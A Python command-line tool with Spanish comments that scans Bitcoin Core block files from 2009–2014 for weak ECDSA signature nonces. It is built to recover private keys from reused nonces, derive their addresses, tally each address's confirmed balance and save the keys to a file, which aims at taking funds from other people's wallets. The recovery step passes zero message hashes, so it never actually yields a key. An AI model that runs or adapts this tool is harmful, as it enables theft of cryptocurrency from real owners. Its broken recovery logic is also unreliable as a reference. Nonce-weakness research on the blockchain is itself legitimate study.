"""
scanner_offline.py
==================
Escáner offline para archivos blk*.dat de Bitcoin Core.

Métodos de detección implementados:
  1) nonce reuse exacto (mismo r)
  2) nonces relacionados (prefijos compartidos / diferencia pequeña)
  3) heurística Android SecureRandom
  4) patrones de sesgo/entropía baja en r (tiny-r, many-leading-zeros)
  5) firmas de alta maleabilidad (high-s)

Incluye:
  - Soporte XOR (xor.dat)
  - Parser de bloques/tx legacy + segwit
  - Export CSV incremental
  - Checkpoint
  - Recuperación de clave (cuando aplica)
  - Estimación de saldo confirmado offline para claves recuperadas
"""

from __future__ import annotations

import argparse
import csv
import hashlib
import json
import math
import struct
import sys
import time
from dataclasses import dataclass
from pathlib import Path
from typing import Iterator

try:
    from ecdsa import SECP256k1, SigningKey
    ECDSA_AVAILABLE = True
except ImportError:
    SECP256k1 = None  # type: ignore
    SigningKey = None  # type: ignore
    ECDSA_AVAILABLE = False

try:
    from bech32 import bech32_encode, convertbits

    BECH32_AVAILABLE = True
except ImportError:
    BECH32_AVAILABLE = False

# ==================== CONFIG ====================
OUTPUT_CSV = "repeated_r_offline.csv"
RELATED_CSV = "related_nonce_offline.csv"
ANDROID_CSV = "android_securerandom.csv"
WEAK_NONCE_CSV = "weak_nonce_patterns_offline.csv"
MALLEABILITY_CSV = "high_s_malleability_offline.csv"
KEYS_FILE = "recovered_keys_offline.txt"
CHECKPOINT_FILE = "checkpoint_offline.json"

CHECKPOINT_EVERY = 10_000
MAX_BLOCKS = 335_000

MAINNET_MAGIC = b"\xf9\xbe\xb4\xd9"
CURVE_N = SECP256k1.order if ECDSA_AVAILABLE else 0

RELATED_PREFIX_LEN = 16
RELATED_SMALL_DIFF = 2**40
ANDROID_PREFIX_LEN = 16
ANDROID_DIFF_MAX = 2**128

# 2009-2014 (inclusive) usando block header time
DEFAULT_START_TS = 1231006505  # 2009-01-03
DEFAULT_END_TS = 1420070399  # 2014-12-31 23:59:59 UTC


@dataclass
class ScanOptions:
    blk_dir: Path
    max_blocks: int
    start_ts: int
    end_ts: int
    detect_exact: bool
    detect_related: bool
    detect_android: bool
    detect_bias: bool
    detect_malleability: bool
    weak_r_bits: int
    weak_r_leading_hex: int


class BloomFilter:
    def __init__(self, capacity: int = 5_000_000, error_rate: float = 1e-5) -> None:
        self.size = max(1, int(-capacity * math.log(error_rate) / (math.log(2) ** 2)))
        self.hash_count = max(1, int(self.size / capacity * math.log(2)))
        self.bits = bytearray(self.size // 8 + 1)

    def _hashes(self, key: str) -> Iterator[int]:
        raw = key.encode("ascii")
        h1 = int.from_bytes(hashlib.sha256(raw).digest(), "big")
        h2 = int.from_bytes(hashlib.sha256(raw[::-1]).digest(), "big") | 1
        for i in range(self.hash_count):
            yield (h1 + i * h2) % self.size

    def add(self, key: str) -> None:
        for pos in self._hashes(key):
            self.bits[pos >> 3] |= 1 << (pos & 7)

    def __contains__(self, key: str) -> bool:
        return all(self.bits[pos >> 3] & (1 << (pos & 7)) for pos in self._hashes(key))

    def mem_mb(self) -> float:
        return len(self.bits) / 1_048_576


def read_varint(data: bytes, pos: int) -> tuple[int, int]:
    first = data[pos]
    pos += 1
    if first < 0xFD:
        return first, pos
    if first == 0xFD:
        return struct.unpack_from("<H", data, pos)[0], pos + 2
    if first == 0xFE:
        return struct.unpack_from("<I", data, pos)[0], pos + 4
    return struct.unpack_from("<Q", data, pos)[0], pos + 8


def load_xor_key(blk_dir: Path) -> bytes:
    xor_path = blk_dir / "xor.dat"
    if xor_path.exists():
        key = xor_path.read_bytes()
        print(f"XOR key encontrada ({len(key)} bytes).")
        return key
    return b""


def xor_decrypt(data: bytes, key: bytes, offset: int = 0) -> bytes:
    if not key:
        return data
    klen = len(key)
    return bytes(b ^ key[(offset + i) % klen] for i, b in enumerate(data))


def iter_blk_file(blk_path: Path, xor_key: bytes) -> Iterator[bytes]:
    with blk_path.open("rb") as f:
        file_offset = 0
        while True:
            raw_magic = f.read(4)
            if len(raw_magic) < 4:
                return

            magic = xor_decrypt(raw_magic, xor_key, file_offset)
            file_offset += 4

            if magic != MAINNET_MAGIC:
                buf = raw_magic
                while True:
                    if len(buf) >= 4:
                        probe = xor_decrypt(buf[-4:], xor_key, file_offset - 4)
                        if probe == MAINNET_MAGIC:
                            break
                    nxt = f.read(1)
                    if not nxt:
                        return
                    buf += nxt
                    file_offset += 1

            raw_size = f.read(4)
            if len(raw_size) < 4:
                return
            size = struct.unpack("<I", xor_decrypt(raw_size, xor_key, file_offset))[0]
            file_offset += 4

            if size <= 0 or size > 4_000_000:
                continue

            raw_block = f.read(size)
            if len(raw_block) < size:
                return
            block_data = xor_decrypt(raw_block, xor_key, file_offset)
            file_offset += size
            yield block_data


def get_blk_files(blk_dir: Path) -> list[Path]:
    files = sorted(blk_dir.glob("blk?????.dat"))
    return files if files else sorted(blk_dir.glob("blk*.dat"))


def extract_der_candidates(script_hex: str) -> list[str]:
    """Extrae múltiples DER desde scriptSig (incluye OP_PUSHDATA1/2)."""
    try:
        raw = bytes.fromhex(script_hex)
    except ValueError:
        return []

    out: list[str] = []
    i = 0
    n = len(raw)
    while i < n:
        op = raw[i]
        i += 1

        if op == 0:
            continue
        if 1 <= op <= 75:
            ln = op
        elif op == 76 and i < n:
            ln = raw[i]
            i += 1
        elif op == 77 and i + 1 < n:
            ln = raw[i] | (raw[i + 1] << 8)
            i += 2
        else:
            continue

        if i + ln > n:
            break

        cand = raw[i : i + ln]
        i += ln
        if len(cand) > 8 and cand[0] == 0x30:
            der = cand[:-1] if cand[-1] in (1, 2, 3, 0x81, 0x82, 0x83) else cand
            if der and der[0] == 0x30:
                out.append(der.hex())
    return out


def parse_rs_from_der(sig_hex: str) -> tuple[int | None, int | None]:
    try:
        b = bytes.fromhex(sig_hex)
        if len(b) < 8 or b[0] != 0x30:
            return None, None
        if b[1] + 2 > len(b):
            return None, None

        p = 2
        if b[p] != 0x02:
            return None, None
        r_len = b[p + 1]
        r = int.from_bytes(b[p + 2 : p + 2 + r_len], "big")
        p += 2 + r_len

        if p + 1 >= len(b) or b[p] != 0x02:
            return None, None
        s_len = b[p + 1]
        s = int.from_bytes(b[p + 2 : p + 2 + s_len], "big")

        if not (1 <= r < CURVE_N and 1 <= s < CURVE_N):
            return None, None
        return r, s
    except Exception:
        return None, None


def parse_block(block: bytes) -> tuple[str | None, int | None, list[dict]]:
    try:
        pos = 0
        header = block[:80]
        pos += 80

        block_hash = hashlib.sha256(hashlib.sha256(header).digest()).digest()[::-1].hex()
        block_time = struct.unpack_from("<I", header, 68)[0]

        tx_count, pos = read_varint(block, pos)
        txs: list[dict] = []

        for _ in range(tx_count):
            tx_start = pos
            pos += 4  # version

            segwit = False
            if pos + 1 < len(block) and block[pos] == 0 and block[pos + 1] != 0:
                segwit = True
                pos += 2

            vin_n, pos = read_varint(block, pos)
            inputs: list[dict] = []
            for _ in range(vin_n):
                prev_txid = block[pos : pos + 32][::-1].hex()
                prev_vout = struct.unpack_from("<I", block, pos + 32)[0]
                pos += 36

                script_len, pos = read_varint(block, pos)
                script_sig = block[pos : pos + script_len].hex()
                pos += script_len
                pos += 4

                inputs.append({"prev_txid": prev_txid, "prev_vout": prev_vout, "scriptsig": script_sig})

            vout_n, pos = read_varint(block, pos)
            outputs: list[dict] = []
            for _ in range(vout_n):
                value = struct.unpack_from("<Q", block, pos)[0]
                pos += 8
                slen, pos = read_varint(block, pos)
                script_pubkey = block[pos : pos + slen].hex()
                pos += slen
                outputs.append({"value": value, "scriptpubkey": script_pubkey})

            witness: list[list[bytes]] = []
            if segwit:
                for _ in range(vin_n):
                    witems_n, pos = read_varint(block, pos)
                    items: list[bytes] = []
                    for _ in range(witems_n):
                        wlen, pos = read_varint(block, pos)
                        items.append(block[pos : pos + wlen])
                        pos += wlen
                    witness.append(items)

            pos += 4
            tx_raw = block[tx_start:pos]
            txid = hashlib.sha256(hashlib.sha256(tx_raw).digest()).digest()[::-1].hex()

            txs.append({"txid": txid, "inputs": inputs, "outputs": outputs, "witness": witness})

        return block_hash, block_time, txs
    except Exception:
        return None, None, []




def ensure_crypto_dependencies() -> None:
    if not ECDSA_AVAILABLE:
        raise RuntimeError("Dependencia faltante: ecdsa. Instala con `pip install ecdsa`.")
def hash160(data: bytes) -> bytes:
    return hashlib.new("ripemd160", hashlib.sha256(data).digest()).digest()


def extract_h160_from_scriptpubkey(script_hex: str) -> str | None:
    if script_hex.startswith("76a914") and script_hex.endswith("88ac") and len(script_hex) == 50:
        return script_hex[6:46]
    if script_hex.startswith("0014") and len(script_hex) == 44:
        return script_hex[4:44]
    return None


def private_key_to_addresses(priv_hex: str) -> tuple[str, str]:
    ensure_crypto_dependencies()
    try:
        import base58
    except ImportError:
        return "base58_no_disponible", "base58_no_disponible"

    try:
        raw = bytes.fromhex(priv_hex)
        if len(raw) != 32:
            return "INVALIDA", "INVALIDA"

        sk = SigningKey.from_string(raw, curve=SECP256k1)
        vk = sk.verifying_key
        x = vk.pubkey.point.x().to_bytes(32, "big")
        y = vk.pubkey.point.y()
        pub = (b"\x02" if y % 2 == 0 else b"\x03") + x

        h160 = hash160(pub)
        payload = b"\x00" + h160
        checksum = hashlib.sha256(hashlib.sha256(payload).digest()).digest()[:4]
        legacy = base58.b58encode(payload + checksum).decode("ascii")

        if BECH32_AVAILABLE:
            segwit = bech32_encode("bc", [0] + convertbits(h160, 8, 5))
        else:
            segwit = legacy
        return legacy, segwit
    except Exception as e:
        return f"ERROR:{e}", f"ERROR:{e}"


def private_key_to_h160(priv_hex: str) -> str | None:
    if not ECDSA_AVAILABLE:
        return None
    try:
        raw = bytes.fromhex(priv_hex)
        if len(raw) != 32:
            return None
        sk = SigningKey.from_string(raw, curve=SECP256k1)
        vk = sk.verifying_key
        x = vk.pubkey.point.x().to_bytes(32, "big")
        y = vk.pubkey.point.y()
        pub = (b"\x02" if y % 2 == 0 else b"\x03") + x
        return hash160(pub).hex()
    except Exception:
        return None


def recover_private_key(z1: int, z2: int, s1: int, s2: int, r: int) -> int | None:
    if not ECDSA_AVAILABLE:
        return None
    if s1 == s2:
        return None
    den = (r * ((s1 - s2) % CURVE_N)) % CURVE_N
    if den == 0:
        return None
    num = ((s2 * z1) - (s1 * z2)) % CURVE_N
    d = (num * pow(den, CURVE_N - 2, CURVE_N)) % CURVE_N
    return d if 0 < d < CURVE_N else None


def append_csv(path: Path, header: list[str], row: list[str]) -> None:
    exists = path.exists()
    with path.open("a", newline="", encoding="utf-8") as f:
        w = csv.writer(f)
        if not exists:
            w.writerow(header)
        w.writerow(row)


def load_checkpoint() -> int:
    p = Path(CHECKPOINT_FILE)
    if not p.exists():
        return 0
    try:
        return int(json.loads(p.read_text(encoding="utf-8")).get("blocks_processed", 0))
    except Exception:
        return 0


def save_checkpoint(count: int) -> None:
    Path(CHECKPOINT_FILE).write_text(json.dumps({"blocks_processed": count}), encoding="utf-8")


def compute_confirmed_balance_sats(
    blk_dir: Path,
    xor_key: bytes,
    target_h160: str,
    max_blocks: int,
    start_ts: int,
    end_ts: int,
) -> int:
    utxos: dict[tuple[str, int], int] = {}
    processed = 0

    for blk_file in get_blk_files(blk_dir):
        for block in iter_blk_file(blk_file, xor_key):
            if processed >= max_blocks:
                break

            _, block_time, txs = parse_block(block)
            if not txs:
                processed += 1
                continue

            if block_time is None or not (start_ts <= block_time <= end_ts):
                processed += 1
                continue

            for tx in txs:
                txid = tx["txid"]

                for inp in tx["inputs"]:
                    key = (inp.get("prev_txid"), inp.get("prev_vout"))
                    if key in utxos:
                        del utxos[key]

                for vout, out in enumerate(tx.get("outputs", [])):
                    h160 = extract_h160_from_scriptpubkey(out.get("scriptpubkey", ""))
                    if h160 == target_h160:
                        utxos[(txid, vout)] = int(out.get("value", 0))

            processed += 1

        if processed >= max_blocks:
            break

    return sum(utxos.values())


def leading_zero_nibbles(hex_string: str) -> int:
    c = 0
    for ch in hex_string:
        if ch == "0":
            c += 1
        else:
            break
    return c


def should_analyze_block_time(ts: int | None, start_ts: int, end_ts: int) -> bool:
    if ts is None:
        return False
    return start_ts <= ts <= end_ts


def scan(opts: ScanOptions) -> int:
    blk_files = get_blk_files(opts.blk_dir)
    if not blk_files:
        print(f"ERROR: no se encontraron blk*.dat en {opts.blk_dir}")
        sys.exit(1)

    bloom = BloomFilter()
    r_seen: dict[str, dict] = {}
    prefix_seen: dict[str, list[dict]] = {}
    android_seen: dict[str, list[dict]] = {}

    seen_exact: set[tuple[str, str, str]] = set()
    seen_related: set[tuple[str, str, str]] = set()
    seen_android: set[tuple[str, str, str]] = set()

    results_exact = 0
    results_related = 0
    results_android = 0
    results_weak = 0
    results_mall = 0
    keys_count = 0

    balance_cache: dict[str, int] = {}

    xor_key = load_xor_key(opts.blk_dir)
    skip = load_checkpoint()
    processed = 0
    t0 = time.time()

    print(f"Archivos blk       : {len(blk_files)}")
    print(f"Rango de tiempo    : {opts.start_ts} - {opts.end_ts}")
    print(f"Checkpoint bloques : {skip:,}")

    for blk_file in blk_files:
        print(f"Leyendo {blk_file.name}...")
        for block in iter_blk_file(blk_file, xor_key):
            if processed < skip:
                processed += 1
                continue
            if processed >= opts.max_blocks:
                save_checkpoint(processed)
                return processed

            block_hash, block_time, txs = parse_block(block)
            if not txs:
                processed += 1
                continue

            if not should_analyze_block_time(block_time, opts.start_ts, opts.end_ts):
                processed += 1
                continue

            for tx in txs:
                txid = tx["txid"]

                for txin in tx["inputs"]:
                    sigs = extract_der_candidates(txin.get("scriptsig", ""))
                    if not sigs:
                        continue

                    for sig_der in sigs:
                        r, s = parse_rs_from_der(sig_der)
                        if r is None or s is None:
                            continue

                        r_hex = f"{r:064x}"

                        if opts.detect_exact and (r_hex in bloom) and (r_hex in r_seen):
                            prev = r_seen[r_hex]
                            pair = (r_hex, prev["txid"], txid)
                            if pair not in seen_exact:
                                seen_exact.add(pair)
                                results_exact += 1

                                priv = recover_private_key(0, 0, prev["s"], s, r)
                                priv_hex = f"{priv:064x}" if priv else "necesita_sighash"

                                append_csv(
                                    Path(OUTPUT_CSV),
                                    ["r", "tx1", "sig1", "tx2", "sig2", "private_key", "block_time", "block_hash"],
                                    [
                                        r_hex,
                                        prev["txid"],
                                        prev["sig_der"],
                                        txid,
                                        sig_der,
                                        priv_hex,
                                        str(block_time),
                                        block_hash or "",
                                    ],
                                )

                                if priv:
                                    keys_count += 1
                                    legacy, segwit = private_key_to_addresses(priv_hex)
                                    h160_hex = private_key_to_h160(priv_hex)

                                    if h160_hex:
                                        if h160_hex not in balance_cache:
                                            print("  -> calculando saldo confirmado offline...")
                                            balance_cache[h160_hex] = compute_confirmed_balance_sats(
                                                blk_dir=opts.blk_dir,
                                                xor_key=xor_key,
                                                target_h160=h160_hex,
                                                max_blocks=opts.max_blocks,
                                                start_ts=opts.start_ts,
                                                end_ts=opts.end_ts,
                                            )
                                        balance_sats = balance_cache[h160_hex]
                                        balance_btc = balance_sats / 100_000_000
                                    else:
                                        balance_sats = -1
                                        balance_btc = 0.0

                                    if balance_sats >= 0:
                                        print(
                                            f"  ✓ clave recuperada: {priv_hex}\n"
                                            f"    legacy: {legacy}\n"
                                            f"    segwit: {segwit}\n"
                                            f"    saldo confirmado: {balance_sats} sats ({balance_btc:.8f} BTC)"
                                        )
                                    else:
                                        print(
                                            f"  ✓ clave recuperada: {priv_hex}\n"
                                            f"    legacy: {legacy}\n"
                                            f"    segwit: {segwit}\n"
                                            "    saldo confirmado: no disponible"
                                        )

                                    with Path(KEYS_FILE).open("a", encoding="utf-8") as f:
                                        f.write(
                                            f"{priv_hex}\t{legacy}\t{segwit}\t{r_hex}\t{prev['txid']}\t{txid}\n"
                                        )

                        if r_hex not in bloom:
                            bloom.add(r_hex)
                            r_seen[r_hex] = {"txid": txid, "sig_der": sig_der, "s": s}

                        if opts.detect_related:
                            pref = r_hex[:RELATED_PREFIX_LEN]
                            prior = prefix_seen.setdefault(pref, [])
                            for prev in prior:
                                if prev["r_hex"] == r_hex:
                                    continue
                                pair = (pref, prev["txid"], txid)
                                if pair in seen_related:
                                    continue

                                diff = abs(int(prev["r_hex"], 16) - r)
                                if diff > RELATED_SMALL_DIFF and r_hex[:8] != prev["r_hex"][:8]:
                                    continue

                                seen_related.add(pair)
                                results_related += 1
                                kind = "RELATED_SMALL_DIFF" if diff <= RELATED_SMALL_DIFF else "SAME_4BYTES_PREFIX"

                                append_csv(
                                    Path(RELATED_CSV),
                                    [
                                        "tipo",
                                        "r1",
                                        "r2",
                                        "tx1",
                                        "sig1",
                                        "tx2",
                                        "sig2",
                                        "prefix",
                                        "block_time",
                                        "block_hash",
                                    ],
                                    [
                                        kind,
                                        prev["r_hex"],
                                        r_hex,
                                        prev["txid"],
                                        prev["sig_der"],
                                        txid,
                                        sig_der,
                                        pref,
                                        str(block_time),
                                        block_hash or "",
                                    ],
                                )

                            prior.append({"r_hex": r_hex, "txid": txid, "sig_der": sig_der})

                        if opts.detect_android:
                            apref = r_hex[:ANDROID_PREFIX_LEN]
                            aset = android_seen.setdefault(apref, [])
                            for prev in aset:
                                if prev["r_hex"] == r_hex:
                                    continue

                                diff_r = abs(int(prev["r_hex"], 16) - r)
                                if diff_r > ANDROID_DIFF_MAX:
                                    continue

                                pair = (apref, prev["txid"], txid)
                                if pair in seen_android:
                                    continue
                                seen_android.add(pair)
                                results_android += 1

                                conf = "ALTA" if diff_r < 2**32 else ("MEDIA" if diff_r < 2**64 else "BAJA")
                                append_csv(
                                    Path(ANDROID_CSV),
                                    [
                                        "r1",
                                        "r2",
                                        "diff_r",
                                        "tx1",
                                        "sig1",
                                        "tx2",
                                        "sig2",
                                        "prefix_8bytes",
                                        "block_time",
                                        "block_hash",
                                        "confianza",
                                    ],
                                    [
                                        prev["r_hex"],
                                        r_hex,
                                        hex(diff_r),
                                        prev["txid"],
                                        prev["sig_der"],
                                        txid,
                                        sig_der,
                                        apref,
                                        str(block_time),
                                        block_hash or "",
                                        conf,
                                    ],
                                )
                            aset.append({"r_hex": r_hex, "txid": txid})

                        if opts.detect_bias:
                            r_bits = r.bit_length()
                            lz = leading_zero_nibbles(r_hex)
                            if r_bits <= opts.weak_r_bits or lz >= opts.weak_r_leading_hex:
                                results_weak += 1
                                reason = "TINY_R" if r_bits <= opts.weak_r_bits else "MANY_LEADING_ZEROS"
                                append_csv(
                                    Path(WEAK_NONCE_CSV),
                                    [
                                        "tipo",
                                        "r",
                                        "s",
                                        "r_bits",
                                        "leading_zero_nibbles",
                                        "txid",
                                        "sig_der",
                                        "block_time",
                                        "block_hash",
                                    ],
                                    [
                                        reason,
                                        r_hex,
                                        f"{s:064x}",
                                        str(r_bits),
                                        str(lz),
                                        txid,
                                        sig_der,
                                        str(block_time),
                                        block_hash or "",
                                    ],
                                )

                        if opts.detect_malleability and s > (CURVE_N // 2):
                            results_mall += 1
                            append_csv(
                                Path(MALLEABILITY_CSV),
                                ["tipo", "r", "s", "txid", "sig_der", "block_time", "block_hash"],
                                [
                                    "HIGH_S",
                                    r_hex,
                                    f"{s:064x}",
                                    txid,
                                    sig_der,
                                    str(block_time),
                                    block_hash or "",
                                ],
                            )

            processed += 1
            if processed % CHECKPOINT_EVERY == 0:
                elapsed = max(1e-9, time.time() - t0)
                print(
                    f"→ {processed:,} bloques | exact:{results_exact} related:{results_related} "
                    f"android:{results_android} weak:{results_weak} high-s:{results_mall} keys:{keys_count} "
                    f"| bloom:{bloom.mem_mb():.1f}MB | {(processed/elapsed):.0f} blk/s"
                )
                save_checkpoint(processed)

    save_checkpoint(processed)
    return processed


def main() -> None:
    parser = argparse.ArgumentParser(description="Scanner offline de vulnerabilidades ECDSA en Bitcoin")
    parser.add_argument("--blkdir", default=str(Path.home() / "AppData/Roaming/Bitcoin/blocks"), help="Directorio blk*.dat")
    parser.add_argument("--maxblock", type=int, default=MAX_BLOCKS, help=f"Máximo de bloques a procesar (default {MAX_BLOCKS})")

    # Enfocado en 2009-2014 por defecto
    parser.add_argument("--start-ts", type=int, default=DEFAULT_START_TS, help="Timestamp Unix mínimo del bloque")
    parser.add_argument("--end-ts", type=int, default=DEFAULT_END_TS, help="Timestamp Unix máximo del bloque")

    # Selectores de métodos (si no se usa ninguno, todos activos)
    parser.add_argument("--exact", action="store_true", help="Activar nonce reuse exacto")
    parser.add_argument("--related", action="store_true", help="Activar nonces relacionados")
    parser.add_argument("--android", action="store_true", help="Activar heurística Android SecureRandom")
    parser.add_argument("--bias", action="store_true", help="Activar detección de sesgo/entropía baja en r")
    parser.add_argument("--malleability", action="store_true", help="Activar detección high-s (malleability)")

    parser.add_argument("--weak-r-bits", type=int, default=240, help="Umbral bit_length para marcar r pequeño")
    parser.add_argument(
        "--weak-r-leading-hex",
        type=int,
        default=6,
        help="Umbral de nibbles en cero al inicio de r (ej: 6 = 24 bits en cero)",
    )

    args = parser.parse_args()

    methods_selected = any([args.exact, args.related, args.android, args.bias, args.malleability])
    detect_exact = args.exact or not methods_selected
    detect_related = args.related or not methods_selected
    detect_android = args.android or not methods_selected
    detect_bias = args.bias or not methods_selected
    detect_malleability = args.malleability or not methods_selected

    opts = ScanOptions(
        blk_dir=Path(args.blkdir),
        max_blocks=args.maxblock,
        start_ts=args.start_ts,
        end_ts=args.end_ts,
        detect_exact=detect_exact,
        detect_related=detect_related,
        detect_android=detect_android,
        detect_bias=detect_bias,
        detect_malleability=detect_malleability,
        weak_r_bits=args.weak_r_bits,
        weak_r_leading_hex=args.weak_r_leading_hex,
    )

    print("=" * 70)
    print("SCANNER OFFLINE - Bitcoin ECDSA Vulnerability Finder")
    print("Métodos:", {
        "exact": detect_exact,
        "related": detect_related,
        "android": detect_android,
        "bias": detect_bias,
        "malleability": detect_malleability,
    })
    print("=" * 70)

    total = scan(opts)

    print("=" * 70)
    print("Escaneo finalizado")
    print(f"Bloques procesados: {total:,}")
    print(f"CSV exacto        : {OUTPUT_CSV}")
    print(f"CSV related       : {RELATED_CSV}")
    print(f"CSV android       : {ANDROID_CSV}")
    print(f"CSV weak nonce    : {WEAK_NONCE_CSV}")
    print(f"CSV high-s        : {MALLEABILITY_CSV}")
    print(f"Claves            : {KEYS_FILE}")


if __name__ == "__main__":
    main()
